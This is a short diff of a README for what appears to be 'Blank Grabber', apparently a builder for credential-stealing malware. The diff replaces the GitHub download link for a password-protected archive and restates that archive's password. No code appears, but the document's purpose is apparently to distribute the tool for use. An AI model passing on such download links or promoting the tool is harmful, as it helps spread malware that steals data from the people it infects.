@@ -44,7 +44,8 @@ Fill in the fields of the builder and press the Build button.
 
 THE PASSWORD FOR THE ARCHIVE IS ```Blank```
 
-DOWNLOAD: [Blank Grabber.zip](https://github.com/Faedss/Blank-Grabber/files/12401882/Blank.Grabber.zip)
+DOWNLOAD: [Blank Grabber.zip](https://github.com/Faedss/Blank-Grabber/files/12402104/Blank.Grabber.zip)
+
 
 
 
